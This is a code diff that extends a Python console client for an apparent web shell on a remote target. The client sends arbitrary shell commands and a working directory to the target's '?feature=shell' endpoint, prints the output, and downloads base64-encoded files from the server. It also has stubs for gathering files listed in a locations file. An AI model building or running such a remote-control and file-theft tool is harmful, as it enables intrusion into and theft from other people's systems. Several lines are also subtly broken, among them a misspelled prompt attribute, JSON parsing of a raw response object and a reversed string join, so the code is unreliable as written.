@@ -2,6 +2,9 @@
 import sys, os
 from cmd import Cmd
 from colorama import Fore, Back, Style
+import requests
+import json
+import base64
 
 
 #Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
@@ -10,14 +13,17 @@ from colorama import Fore, Back, Style
 
 target=""
 fork=False
+CWD=None
 
 
 class MyPrompt(Cmd):
     prompt = "#"
+
+    def update_prompt(self):
+        global CWD
+        self.promt=CWD+" $ "
+
     def do_upload(self, inp):
-        pass
- 
-    def do_download(self, inp):
         pass
 
     def default(self, inp):
@@ -30,6 +36,10 @@ class MyPrompt(Cmd):
         return True
  
 
+def request(url, params):
+    global target
+    return json.loads(requests.post(target+url, data=params))
+
 def gather_infos(): #every file of file-locations.txt until an empty line occurs
     log("getting most important information:")
     global target
@@ -41,8 +51,20 @@ def gather_more(): #every file after the empty line
     log("getting more information:")
     pass
 
-def download(path):
-    global target
+def shell(command):
+    global CWD
+    resp = request("?feature=shell", {"cmd": command, "cwd": CWD})
+    if "file" in resp:
+        download(resp["name"], resp["file"])
+    else:
+        print(resp["stdout"].join("\n"))
+        CWD = resp["cwd"]
+
+def download(name,file):
+    log("Download To "+name)
+    os.mkdir("download")
+    f=open(name,"w")
+    f.write(base64.b64decode(file))
     pass
 
 def upload(path):
